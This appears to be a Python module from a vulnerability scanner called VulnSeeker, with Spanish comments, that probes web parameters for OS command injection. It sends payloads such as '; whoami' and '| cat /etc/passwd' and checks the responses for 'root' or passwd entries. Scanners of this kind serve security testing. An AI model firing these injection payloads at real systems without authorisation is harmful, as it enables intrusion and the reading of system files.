import requests
import logging
import re
from core.scanner_types import ScannerModule, Vulnerability, Target, Severity

logger = logging.getLogger("VulnSeeker.CmdInjection")


class CommandInjectionScanner(ScannerModule):
    """
    Escáner de Inyección de Comandos (OS Command Injection).
    Intenta ejecutar comandos del sistema operativo concatenando operadores.
    """

    @property
    def name(self) -> str:
        return "OS Command Injection"

    @property
    def description(self) -> str:
        return "Detecta ejecución remota de comandos (RCE) mediante operadores de sistema (;, &&, |)."

    def run(self, target: Target) -> list[Vulnerability]:
        vulns = []

        # 1. Definir los Payloads (Cargas explosivas)
        payloads = [
            ("; whoami", "root"),  # Linux
            ("; whoami", "www-data"),  # Apache
            ("&& whoami", "root"),
            ("&& whoami", "www-data"),
            ("| whoami", "root"),
            ("| whoami", "www-data"),
            ("; cat /etc/passwd", "root:x:0:0"),
            ("&& cat /etc/passwd", "root:x:0:0"),
            ("| cat /etc/passwd", "root:x:0:0"),
        ]

        # 2. Identificar dónde atacar
        params_to_test = []

        # A) Si ya nos dan parámetros en el target (POST o GET), los usamos
        if target.params:
            params_to_test = list(target.params.keys())

        # B) Si es GET y están en la URL
        elif "?" in target.url:
            try:
                query_string = target.url.split("?")[1]
                for pair in query_string.split("&"):
                    if "=" in pair:
                        key = pair.split("=")[0]
                        params_to_test.append(key)
            except:
                pass

        # C) Si no hay nada, probamos sospechosos (Blind guess)
        if not params_to_test:
            params_to_test = ['ip', 'host', 'domain', 'ping', 'addr', 'cmd', 'exec', 'target']

        logger.info(f"🐚 CmdInjection: Probando {len(params_to_test)} parámetros en {target.url}")

        headers = {'User-Agent': 'VulnSeeker/1.0'}
        if target.headers:
            headers.update(target.headers)

        session = requests.Session()

        for param in params_to_test:
            for payload, expected_string in payloads:
                # payload ataque: 127.0.0.1; whoami
                attack_val = f"127.0.0.1{payload}"

                # --- LÓGICA CORREGIDA: PRESERVAR PARÁMETROS ---
                attack_url = target.url
                data = {}

                if target.method == "POST":
                    # Copiamos los parámetros originales para no perder el botón 'Submit'
                    if target.params:
                        data = target.params.copy()

                    # Inyectamos solo en el parámetro actual
                    data[param] = attack_val

                else:  # GET
                    if "?" in target.url and param in target.url:
                        # Reemplazo en URL
                        attack_url = re.sub(f"{param}=[^&]*", f"{param}={attack_val}", target.url)
                    else:
                        # Append
                        sep = "&" if "?" in attack_url else "?"
                        attack_url = f"{attack_url}{sep}{param}={attack_val}"

                try:
                    if target.method == "POST":
                        resp = session.post(attack_url, data=data, headers=headers, timeout=5, verify=False)
                    else:
                        resp = session.get(attack_url, headers=headers, timeout=5, verify=False)

                    # 3. Análisis
                    if expected_string in resp.text:
                        desc = (f"Se detectó Inyección de Comandos (RCE).\n"
                                f"El servidor ejecutó: '{payload.strip()}'\n"
                                f"Output encontrado: '{expected_string}'")

                        v = Vulnerability(
                            name="OS Command Injection (RCE)",
                            severity=Severity.CRITICAL,
                            description=desc,
                            target_url=target.url,
                            evidence=f"Payload: {attack_val} | Found: {expected_string}",
                            payload=attack_val
                        )
                        vulns.append(v)
                        logger.info(f"💥 ¡COMMAND INJECTION DETECTADO! Param: {param}")
                        break

                except Exception:
                    pass

        return vulns